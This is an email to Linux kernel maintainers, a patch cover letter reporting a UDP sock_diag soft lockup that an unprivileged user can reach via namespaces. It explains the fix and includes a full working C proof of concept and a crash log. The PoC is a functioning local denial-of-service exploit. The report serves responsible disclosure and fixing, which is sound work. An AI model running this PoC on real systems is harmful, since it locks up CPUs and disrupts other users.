Received: from mail-pf1-f180.google.com (mail-pf1-f180.google.com [209.85.210.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C69BA478E52
	for <stable@vger.kernel.org>; Tue,  1 Sep 2026 09:26:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788254772; cv=none; b=vCAteyMIDVAzVXASidO5GmPzHLZhYXuE3a3F/eavaRUulVmRdwRhdTci42eCDVsMGP3fEA1I/8/2l+Snge6N/FqNzGQbKuvW6xsdDI8Du9fOsOaCnd3osXtRbZKRQqg4MhSvvK9tPjcirHu7UOqXeRqQEhNKMnqSvanZjeuQWYA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788254772; c=relaxed/simple;
	bh=+TfBBNVSW+3mQ5zmrEn3Ac8/pC3h5+cyprRCGNaL30E=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=kgpES3J82NcsVTH//vWJ8FWi5hIkjbCn9cTpRac7bOmwsDX9CfklpqaaSVDgocWCMAPo+Jzvqs17Fm1UoXNrndcFXekmLwxpAjGDfrX16GETJZR1Oba7ILMmVlHFHf7WDzMC+5TRAJztgqETZVxaIYsj5y76T5/EZhqCuqdUvkA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=g9qJ+4Qo; arc=none smtp.client-ip=209.85.210.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="g9qJ+4Qo"
Received: by mail-pf1-f180.google.com with SMTP id d2e1a72fcca58-84f216add2eso622637b3a.0
        for <stable@vger.kernel.org>; Tue, 01 Sep 2026 02:26:08 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788254767; x=1788859567; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=6NNveZqnovAqYA04G2Ivz50mLD0rU/J+XFd18fZXx6A=;
        b=g9qJ+4QoFM+v5Gyl9NUqblUDiNZLoLvT70iIpnpysbemtVFwxLIPdnCCziP9YZnF2p
         Ema5TPIMnt3VzFOqYYnrkVPMb6uonlADNgNYF+QczNDJ0cFTiTwTyAGcBqdgSvzaw05N
         oTEvRQ/NnYC9WuVY1vpmS56lzu/seXQtqbmdFHqxGlcqP1V12gV+JUan7CRuZUEoyZQ/
         FvzX9DQpf/OQ10Kh2d6VmrK8N0eraOQnPby7dWznD8MTk3dOo+q02Y1bUFwlgzvmwE6x
         PWJKnJrOcWQuOxHBbGsmq9brISLkdiJ5ojK4Ua5pzM93aa8LVNYd8JYpGM0j1BifVdf/
         wBrQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788254767; x=1788859567;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=6NNveZqnovAqYA04G2Ivz50mLD0rU/J+XFd18fZXx6A=;
        b=lIf0+Rxb00ovkKvbS7Q3XDQkinOW5S9OJdoN18oUeNSqrixozx3+ZPW/TkYnad9Gj9
         No01p2uvCfksk5W1tbcG1NM6uCEMZw4OJPRJN4XEqbk95y4UIvH9s/T4rIbI+z3/ee7B
         deIgRWafEqNQ0NaCP/m2e4/6BFsJomyRknMQkbvofqLcxp2Ys6WgwtdTRURQZRKhCw+c
         yI8pzXA6gH5WE34VbIWHTCDlUkD5cLKCiXdGXU2MJiCk3nU/m+5wXcyfZN6nVtaa4Wpm
         K8FP8hecNmqYiKWR2DWMMs6/5pHSGQB5nDXRXBXxfpPPY5D2CcgQUgZqytSlY7i6bap+
         tpEQ==
X-Forwarded-Encrypted: i=1; AHgh+Rr+soEs79guDCfTwt6KGkUHhANThwRQHDtF4UkervsX4DX3awGOaYJbfJ9MU/OvTGHl//mT7SM=@vger.kernel.org
X-Gm-Message-State: AFuF++nmZNGvOqvnaUB4F5YwBSgoJF9VqzfNi6CAtvPz8raLDDaGcJTg
	JLPmSMhKLLGkxTN1qDMyvZrWSWVWc9gAjV6GwuzlsLNuPXIf0l22RDvIUBbKa/8VdSiP
X-Gm-Gg: AR+sD11ZQd8KBNpQOWM+q4bTEt6HqMvNKvSL8J7jPSQtPps4C1SlFM5p24JDbIsZCl7
	xx6j3bTyosguCXZV+HmOjMzfkD7TkjXhfV5aNUkYp7Ew0jWIROMacC33Vss3cOqbwe3clgfpv/A
	4mpIhoM7axQE/WV3YNzEVGK4jBPbZRnmdejgE5BGJZbAww3hsPLEo6U6Po3xJQNfOyeuQDknjjv
	GHg/lhfzJ29GTWvL7iNb32fK+RvdoyWAFCEbGF0GbY+s9w9b8Pn5h2Uf0ojaS+VpcZxfeqI+VTs
	orvdSPvnrHYbHJzNiDrQlaB27ATtouh8BzbJ48LzI6g4Z8nwuISLl2GhJTYIC1ynXBhFs/O8ULE
	XKVPkWE+e/mH9S8PnnCukfAqupXChkmLE3pF5mYfiI7eZ4vFNzHnvlVFfsaycPZTvSX/9jOOjKM
	70EEyP4HqRPPtDgbjx1JiW5wMO+yN/QUjGD1BZyc3X8OrX8pW78+Fm1fjU14iPAQyQEmpnb46XB
	HlVVPAvt17DttpaV3d8pewqCN87JA==
X-Received: by 2002:a05:6a00:174c:b0:852:355b:2430 with SMTP id d2e1a72fcca58-85b59c6e5ebmr8947674b3a.10.1788254765449;
        Tue, 01 Sep 2026 02:26:05 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc1f32f660fsm5612135a12.2.2026.09.01.02.26.02
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 01 Sep 2026 02:26:04 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Pavel Emelyanov <xemul@parallels.com>,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org
Subject: [PATCH net 0/1] udp: diag: bound bucket lock hold time
Date: Tue,  1 Sep 2026 09:25:58 +0000
Message-ID: <cover.1788187473.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/udp_diag.c. The bug is reachable
by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

udp_diag_dump() walks each primary UDP hash bucket while holding
spin_lock_bh(&hslot->lock).  It currently executes the request's diagnostic
bytecode and fills a netlink response for every socket before releasing the
lock.  A non-root requester can populate one bucket with many UDP sockets and
submit a near-maximum filter that rejects each socket, making the non-
preemptible lock hold attacker-scaled and causing soft lockups.  The crashing
6.12.95 splat names this walker udp_dump(); current net names it
udp_diag_dump().

The fix walks at most 16 sockets while the bucket lock is held, takes a
reference for sockets that pass the inexpensive filters, and performs the
bytecode filtering and response filling after releasing the lock.  A
referenced hash-list cursor resumes each batch at the next unprocessed entry,
so filtered entries cannot extend the locked walk.  The previous resume
reference is dropped after the next batch is collected so an -EMSGSIZE retry
cannot put a socket twice.  The cursor is retained for -EMSGSIZE retries and
released when the dump completes.  An extra module
reference keeps INET_UDP_DIAG loaded until that cleanup runs.  Concurrent
insertion or deletion can still change pagination results; this patch does
not provide an atomic snapshot.  If the cursor is unhashed, the walk
restarts from the current bucket head and may repeat sockets, but each
lock hold still covers at most 16 entries.  Socket references preserve object lifetime,
but fields read while filling the response can change after unlocking, so a
slightly stale diagnostic snapshot is possible.  The underlying lock scope
was introduced by b6d640c2286d ("udp_diag: Implement the dump-all
functionality").

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

The supplied reproducer uses the equivalent invocation below to create
colliding UDP sockets and a large rejecting bytecode program:

    unshare -Urn ./poc -n 120000 -b 15000 -g 4 -s 2048 -p 10000 -W

packetdrill is not used here because the trigger depends on creating a large
SO_REUSEPORT socket set, constructing a large inet-diag bytecode program, and
issuing a SOCK_DIAG_BY_FAMILY netlink dump; it does not depend on a packet
sequence or protocol state transition that packetdrill can express.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

The attached crash log is from an earlier QEMU run whose guest had more
than two CPUs; the watchdog reported the lockup on CPU#3.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/inet_diag.h>
#include <linux/netlink.h>
#include <linux/sock_diag.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif

#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int) NLA_ALIGN(sizeof(struct nlattr)))
#endif

struct options {
	int sockets;
	int nops;
	int port;
	int groups;
	int stride;
	int proto;
	int reject_dport;
	int bind_worker;
};

struct bind_worker {
	volatile sig_atomic_t stop;
	int proto;
	int port;
	uint64_t max_bind_ns;
	uint64_t slow_binds;
	uint64_t iterations;
	int last_errno;
};

static uint64_t monotonic_ns(void)
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
		perror("clock_gettime");
		exit(1);
	}

	return (uint64_t)ts.tv_sec * 1000000000ULL + ts.tv_nsec;
}

static void die_errno(const char *what)
{
	perror(what);
	exit(1);
}

static void raise_nofile_limit(int want)
{
	struct rlimit lim;

	if (getrlimit(RLIMIT_NOFILE, &lim) != 0)
		die_errno("getrlimit");

	if ((rlim_t)want <= lim.rlim_cur)
		return;

	if ((rlim_t)want > lim.rlim_max)
		lim.rlim_cur = lim.rlim_max;
	else
		lim.rlim_cur = want;

	if (setrlimit(RLIMIT_NOFILE, &lim) != 0)
		die_errno("setrlimit");

	if (getrlimit(RLIMIT_NOFILE, &lim) != 0)
		die_errno("getrlimit(verify)");

	printf("[*] RLIMIT_NOFILE now soft=%llu hard=%llu\n",
	       (unsigned long long)lim.rlim_cur,
	       (unsigned long long)lim.rlim_max);
}

static int set_reuse_opts(int fd)
{
	int one = 1;
	int buf = 4096;

	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) != 0)
		return -1;
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one)) != 0)
		return -1;
	setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &buf, sizeof(buf));
	setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
	return 0;
}

static void *bind_worker_main(void *arg)
{
	struct bind_worker *w = arg;
	struct sockaddr_in addr;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(w->port);
	addr.sin_addr.s_addr = htonl(INADDR_ANY);

	while (!w->stop) {
		uint64_t start;
		uint64_t end;
		int fd;

		fd = socket(AF_INET, SOCK_DGRAM, w->proto);
		if (fd < 0) {
			w->last_errno = errno;
			break;
		}

		if (set_reuse_opts(fd) != 0) {
			w->last_errno = errno;
			close(fd);
			break;
		}

		start = monotonic_ns();
		if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
			w->last_errno = errno;
			close(fd);
			break;
		}
		end = monotonic_ns();

		if (end - start > w->max_bind_ns)
			w->max_bind_ns = end - start;
		if (end - start > 1000000ULL)
			w->slow_binds++;
		w->iterations++;
		close(fd);
	}

	return NULL;
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [-n sockets] [-b nop_ops] [-p base_port] [-g groups] [-s stride] [-d reject_dport] [-U] [-W]\n"
		"  -n sockets       total number of bound sockets to create (default: 70000)\n"
		"  -b nop_ops       number of bytecode NOPs before final reject (default: 15000)\n"
		"  -p base_port     first local UDP/UDP-Lite port (default: 10000)\n"
		"  -g groups        number of same-bucket port groups to fill (default: 1)\n"
		"  -s stride        per-group port increment; 2048 matches udp_hash_entries=2048 (default: 2048)\n"
		"  -d reject_dport  final impossible destination port filter (default: 1)\n"
		"  -U               use UDP-Lite instead of UDP\n"
		"  -W               disable the concurrent bind worker\n",
		prog);
}

static void parse_opts(int argc, char **argv, struct options *opts)
{
	int c;

	opts->sockets = 70000;
	opts->nops = 15000;
	opts->port = 10000;
	opts->groups = 1;
	opts->stride = 2048;
	opts->proto = IPPROTO_UDP;
	opts->reject_dport = 1;
	opts->bind_worker = 1;

	while ((c = getopt(argc, argv, "n:b:p:g:s:d:UW")) != -1) {
		switch (c) {
		case 'n':
			opts->sockets = atoi(optarg);
			break;
		case 'b':
			opts->nops = atoi(optarg);
			break;
		case 'p':
			opts->port = atoi(optarg);
			break;
		case 'g':
			opts->groups = atoi(optarg);
			break;
		case 's':
			opts->stride = atoi(optarg);
			break;
		case 'd':
			opts->reject_dport = atoi(optarg);
			break;
		case 'U':
			opts->proto = IPPROTO_UDPLITE;
			break;
		case 'W':
			opts->bind_worker = 0;
			break;
		default:
			usage(argv[0]);
			exit(1);
		}
	}

	if (opts->sockets < 1 || opts->nops < 1 || opts->port < 1 ||
	    opts->groups < 1 || opts->stride < 1 ||
	    opts->port > 65535 || opts->reject_dport < 0 ||
	    opts->reject_dport > 65535) {
		usage(argv[0]);
		exit(1);
	}

	if (opts->port + (opts->groups - 1) * opts->stride > 65535) {
		fprintf(stderr, "[-] port range exceeds 65535\n");
		exit(1);
	}
}

static int create_bound_sockets(const struct options *opts, int **fds_out)
{
	struct sockaddr_in addr;
	unsigned short *group_ports;
	unsigned int *group_counts;
	unsigned char *group_full;
	int *fds;
	int created = 0;
	int active_groups;
	int g;

	fds = calloc((size_t)opts->sockets, sizeof(*fds));
	if (!fds)
		die_errno("calloc sockets");
	group_ports = calloc((size_t)opts->groups, sizeof(*group_ports));
	group_counts = calloc((size_t)opts->groups, sizeof(*group_counts));
	group_full = calloc((size_t)opts->groups, sizeof(*group_full));
	if (!group_ports || !group_counts || !group_full)
		die_errno("calloc groups");

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	for (g = 0; g < opts->groups; g++)
		group_ports[g] = (unsigned short)(opts->port + g * opts->stride);

	active_groups = opts->groups;

	while (created < opts->sockets && active_groups > 0) {
		int progress = 0;

		for (g = 0; g < opts->groups && created < opts->sockets; g++) {
			int fd;

			if (group_full[g])
				continue;

			fd = socket(AF_INET, SOCK_DGRAM, opts->proto);
			if (fd < 0) {
				fprintf(stderr, "[-] socket failed at %d: %s\n",
					created, strerror(errno));
				goto out;
			}
			if (set_reuse_opts(fd) != 0) {
				fprintf(stderr, "[-] setsockopt failed at %d: %s\n",
					created, strerror(errno));
				close(fd);
				goto out;
			}

			addr.sin_port = htons(group_ports[g]);
			if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
				if (errno == EADDRINUSE) {
					group_full[g] = 1;
					active_groups--;
					close(fd);
					continue;
				}
				fprintf(stderr, "[-] bind failed at %d on port %u: %s\n",
					created, group_ports[g], strerror(errno));
				close(fd);
				goto out;
			}

			fds[created++] = fd;
			group_counts[g]++;
			progress = 1;
			if (created % 5000 == 0)
				printf("[*] created %d sockets\n", created);
		}

		if (!progress)
			break;
	}

out:
	for (g = 0; g < opts->groups; g++)
		printf("[*] port %u count=%u%s\n",
		       group_ports[g], group_counts[g],
		       group_full[g] ? " (group full)" : "");

	free(group_ports);
	free(group_counts);
	free(group_full);
	*fds_out = fds;
	return created;
}

static void close_sockets(int *fds, int count)
{
	int i;

	if (!fds)
		return;

	for (i = 0; i < count; i++) {
		if (fds[i] > 0)
			close(fds[i]);
	}
	free(fds);
}

static unsigned char *build_bc_payload(const struct options *opts, size_t *len_out)
{
	size_t len = (size_t)opts->nops * sizeof(struct inet_diag_bc_op) +
		     2 * sizeof(struct inet_diag_bc_op);
	unsigned char *payload;
	struct inet_diag_bc_op *op;
	int i;

	payload = calloc(1, len);
	if (!payload)
		die_errno("calloc bytecode");

	op = (struct inet_diag_bc_op *)payload;
	for (i = 0; i < opts->nops; i++) {
		op[i].code = INET_DIAG_BC_NOP;
		op[i].yes = sizeof(struct inet_diag_bc_op);
		op[i].no = 0;
	}

	op = (struct inet_diag_bc_op *)(payload + len - 2 * sizeof(*op));
	op[0].code = INET_DIAG_BC_D_EQ;
	op[0].yes = 2 * sizeof(*op);
	op[0].no = 3 * sizeof(*op);
	op[1].code = 0;
	op[1].yes = 0;
	op[1].no = (unsigned short)opts->reject_dport;

	*len_out = len;
	return payload;
}

static int create_diag_socket(void)
{
	int fd;
	struct sockaddr_nl local;
	struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG);
	if (fd < 0)
		die_errno("socket(NETLINK_SOCK_DIAG)");

	memset(&local, 0, sizeof(local));
	local.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) != 0)
		die_errno("bind(netlink)");

	if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) != 0)
		die_errno("setsockopt(SO_RCVTIMEO)");

	return fd;
}

static int run_diag_dump(const struct options *opts, size_t bc_len)
{
	size_t req_len = NLMSG_SPACE(sizeof(struct inet_diag_req_v2)) +
			 NLA_HDRLEN + NLA_ALIGN(bc_len);
	struct sockaddr_nl kernel = { .nl_family = AF_NETLINK };
	unsigned char *payload;
	struct inet_diag_req_v2 *req;
	struct nlattr *attr;
	struct nlmsghdr *nlh;
	struct iovec iov;
	struct msghdr msg;
	unsigned char *buf;
	ssize_t sent;
	int fd;
	int done = 0;

	fd = create_diag_socket();
	buf = calloc(1, req_len);
	if (!buf)
		die_errno("calloc netlink request");

	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*req));
	nlh->nlmsg_type = SOCK_DIAG_BY_FAMILY;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
	nlh->nlmsg_seq = 1;

	req = (struct inet_diag_req_v2 *)NLMSG_DATA(nlh);
	req->sdiag_family = AF_INET;
	req->sdiag_protocol = opts->proto;
	req->idiag_states = 0xffffffffU;
	if (opts->groups == 1)
		req->id.idiag_sport = htons((unsigned short)opts->port);
	req->id.idiag_cookie[0] = INET_DIAG_NOCOOKIE;
	req->id.idiag_cookie[1] = INET_DIAG_NOCOOKIE;

	attr = (struct nlattr *)(buf + NLMSG_ALIGN(nlh->nlmsg_len));
	attr->nla_type = INET_DIAG_REQ_BYTECODE;
	attr->nla_len = NLA_HDRLEN + bc_len;
	payload = build_bc_payload(opts, &bc_len);
	memcpy((unsigned char *)attr + NLA_HDRLEN, payload, bc_len);
	free(payload);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(attr->nla_len);

	iov.iov_base = buf;
	iov.iov_len = nlh->nlmsg_len;
	memset(&msg, 0, sizeof(msg));
	msg.msg_name = &kernel;
	msg.msg_namelen = sizeof(kernel);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	sent = sendmsg(fd, &msg, 0);
	if (sent < 0 && errno != EINTR)
		die_errno("sendmsg(sock_diag)");
	printf("[*] sendmsg returned %zd (%s)\n", sent,
	       sent < 0 ? strerror(errno) : "ok");

	while (!done) {
		unsigned char reply[8192];
		struct iovec riov = {
			.iov_base = reply,
			.iov_len = sizeof(reply),
		};
		struct msghdr rmsg;
		ssize_t got;

		memset(&rmsg, 0, sizeof(rmsg));
		rmsg.msg_iov = &riov;
		rmsg.msg_iovlen = 1;
		got = recvmsg(fd, &rmsg, 0);
		if (got < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK) {
				printf("[*] recvmsg timed out waiting for NLMSG_DONE\n");
				break;
			}
			die_errno("recvmsg(sock_diag)");
		}

		for (nlh = (struct nlmsghdr *)reply; NLMSG_OK(nlh, got);
		     nlh = NLMSG_NEXT(nlh, got)) {
			if (nlh->nlmsg_type == NLMSG_DONE) {
				done = 1;
				break;
			}
			if (nlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(nlh);

				fprintf(stderr, "[-] NLMSG_ERROR %d\n", err->error);
				done = 1;
				break;
			}
		}
	}

	close(fd);
	free(buf);
	return done ? 0 : 1;
}

int main(int argc, char **argv)
{
	struct bind_worker worker;
	struct options opts;
	pthread_t worker_tid;
	int worker_started = 0;
	int *fds = NULL;
	int created;
	size_t bc_len;
	uint64_t start_ns;
	uint64_t end_ns;
	int rc;

	parse_opts(argc, argv, &opts);

	printf("[*] target proto=%s sockets=%d nop_ops=%d base_port=%d groups=%d stride=%d reject_dport=%d\n",
	       opts.proto == IPPROTO_UDPLITE ? "udp-lite" : "udp",
	       opts.sockets, opts.nops, opts.port, opts.groups, opts.stride,
	       opts.reject_dport);

	raise_nofile_limit(opts.sockets + 256);
	created = create_bound_sockets(&opts, &fds);
	if (created < 1000) {
		fprintf(stderr, "[-] only created %d sockets; aborting\n", created);
		close_sockets(fds, created);
		return 1;
	}
	printf("[*] created %d/%d sockets\n", created, opts.sockets);

	if (created != opts.sockets)
		printf("[*] continuing with the created sockets count\n");

	memset(&worker, 0, sizeof(worker));
	worker.proto = opts.proto;
	worker.port = opts.port;

	if (opts.bind_worker) {
		if (pthread_create(&worker_tid, NULL, bind_worker_main, &worker) != 0)
			die_errno("pthread_create");
		worker_started = 1;
	}

	bc_len = (size_t)opts.nops * sizeof(struct inet_diag_bc_op) +
		 2 * sizeof(struct inet_diag_bc_op);
	printf("[*] bytecode payload size=%zu bytes\n", bc_len);

	start_ns = monotonic_ns();
	rc = run_diag_dump(&opts, bc_len);
	end_ns = monotonic_ns();

	if (worker_started) {
		worker.stop = 1;
		pthread_join(worker_tid, NULL);
	}

	printf("[*] sock_diag round-trip %.3f s\n",
	       (double)(end_ns - start_ns) / 1000000000.0);
	if (opts.bind_worker) {
		printf("[*] bind worker iterations=%llu max_bind=%.3f ms slow_binds=%llu last_errno=%d (%s)\n",
		       (unsigned long long)worker.iterations,
		       (double)worker.max_bind_ns / 1000000.0,
		       (unsigned long long)worker.slow_binds,
		       worker.last_errno,
		       worker.last_errno ? strerror(worker.last_errno) : "none");
	}

	close_sockets(fds, created);
	return rc;
}
------END poc.c--------

----BEGIN crash log----
The crash log below is sanitized output from scripts/decode_stacktrace.sh.
The crashing 6.12.95 build reports the walker as udp_dump(); current net
names it udp_diag_dump(), so that frame stays as an offset.  Other frames
and source locations were decoded with the available vmlinux; the local
build path was removed from the externally shared copy.
[  495.222914][    C3] watchdog: BUG: soft lockup - CPU#3 stuck for 3s! [poc:10522]
[  495.223213][    C3] Modules linked in:
[  495.223221][    C3] irq event stamp: 16298727
[  495.223243][    C3] hardirqs last  enabled at (16298726): irqentry_exit (arch/x86/include/asm/entry-common.h:62 include/linux/irq-entry-common.h:210 include/linux/irq-entry-common.h:244 include/linux/irq-entry-common.h:315 kernel/entry/common.c:165)
[  495.223368][    C3] hardirqs last disabled at (16298727): sysvec_apic_timer_interrupt (arch/x86/kernel/apic/apic.c:1062)
[  495.223386][    C3] softirqs last  enabled at (16297972): udp_dump+0x2d7/0x6f0
[  495.223451][    C3] softirqs last disabled at (16297974): udp_dump+0x248/0x6f0
[  495.223506][    C3] CPU: 3 UID: 1028 PID: 10522 Comm: poc Not tainted 6.12.95 #2
[  495.223526][    C3] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  495.223532][    C3] RIP: 0010:inet_diag_bc_sk (net/ipv4/inet_diag.c:497 net/ipv4/inet_diag.c:631)
[  495.223555][    C3] RSP: 0018:ffffc9001402f378 EFLAGS: 00000297
[  495.223580][    C3] RAX: 0000000000000000 RBX: ffff88802c2630ec RCX: 0000000000000007
[  495.223582][    C3] RDX: 0000000000000004 RSI: ffff888051fe2040 RDI: ffff88802c2630e9
[  495.223585][    C3] RBP: 000000000000b9c8 R08: 0000000000000002 R09: 0000000000000000
[  495.223587][    C3] R10: 00000000000016d2 R11: ffff888051fe2044 R12: dffffc0000000000
[  495.223589][    C3] R13: 0000000000000000 R14: 0000000000002710 R15: 000000000000000b
[  495.223593][    C3] FS:  00007f4c3de74740(0000) GS:ffff888118b80000(0000) knlGS:0000000000000000
[  495.223599][    C3] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  495.223601][    C3] CR2: 00005622210de000 CR3: 0000000112d18000 CR4: 0000000000750ef0
[  495.223604][    C3] PKRU: 55555554
[  495.223605][    C3] Call Trace:
[  495.223614][    C3]  <TASK>
[  495.223642][    C3]  udp_dump+0x45d/0x6f0
[  495.223682][    C3]  __inet_diag_dump (net/ipv4/inet_diag.c:928)
[  495.223702][    C3]  netlink_dump (net/netlink/af_netlink.c:1922)
[  495.223738][    C3]  ? __pfx_netlink_dump (net/netlink/af_netlink.c:2883)
[  495.223771][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.223798][    C3]  ? ns_capable (kernel/capability.c:339)
[  495.223866][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.223870][    C3]  ? __inet_diag_dump_start (net/ipv4/inet_diag.c:774 net/ipv4/inet_diag.c:862)
[  495.223888][    C3]  __netlink_dump_start (net/netlink/af_netlink.c:967 net/netlink/af_netlink.c:1020)
[  495.223904][    C3]  inet_diag_handler_cmd (net/ipv4/inet_diag.c:806 net/ipv4/inet_diag.c:862)
[  495.223912][    C3]  ? __pfx_inet_diag_handler_cmd (net/ipv4/inet_diag.c:966)
[  495.223916][    C3]  ? __pfx_lock_release+0x10/0x10
[  495.223953][    C3]  ? __pfx_inet_diag_dump_start (net/ipv4/inet_diag.c:891)
[  495.223957][    C3]  ? __pfx_inet_diag_dump (net/ipv4/inet_diag.c:928)
[  495.223961][    C3]  ? __pfx_inet_diag_dump_done (net/ipv4/inet_diag.c:508)
[  495.223971][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.223978][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.223993][    C3]  sock_diag_rcv_msg (net/core/sock_diag.c:131 (discriminator 1) net/core/sock_diag.c:159 (discriminator 1))
[  495.224036][    C3]  netlink_rcv_skb (net/netlink/af_netlink.c:2592)
[  495.224042][    C3]  ? __pfx_sock_diag_rcv_msg (net/core/sock_diag.c:306)
[  495.224053][    C3]  ? __pfx_netlink_rcv_skb (include/linux/skbuff.h:2772 (discriminator 1))
[  495.224057][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.224088][    C3]  ? netlink_deliver_tap+0xcb/0xa80
[  495.224095][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.224098][    C3]  ? netlink_deliver_tap+0x14b/0xa80
[  495.224117][    C3]  netlink_unicast (include/net/scm.h:73 (discriminator 1) include/net/scm.h:98 (discriminator 1) net/netlink/af_netlink.c:1838 (discriminator 1))
[  495.224132][    C3]  ? __pfx_netlink_unicast (net/netlink/af_netlink.c:1255)
[  495.224135][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.224140][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.224146][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.224149][    C3]  ? __check_object_size+0x2eb/0x4f0
[  495.224210][    C3]  netlink_sendmsg (net/netlink/af_netlink.c:2549)
[  495.224227][    C3]  ? __pfx_netlink_sendmsg (net/netlink/af_netlink.c:1361)
[  495.224243][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.224246][    C3]  ? apparmor_socket_sendmsg+0x2e/0x200
[  495.224305][    C3]  ____sys_sendmsg (include/linux/audit.h:496 net/socket.c:257)
[  495.224331][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.224337][    C3]  ? __pfx_____sys_sendmsg (net/socket.c:1151 (discriminator 1))
[  495.224341][    C3]  ? __pfx_copy_msghdr_from_user (net/socket.c:2607)
[  495.224381][    C3]  ___sys_sendmsg (net/socket.c:2965)
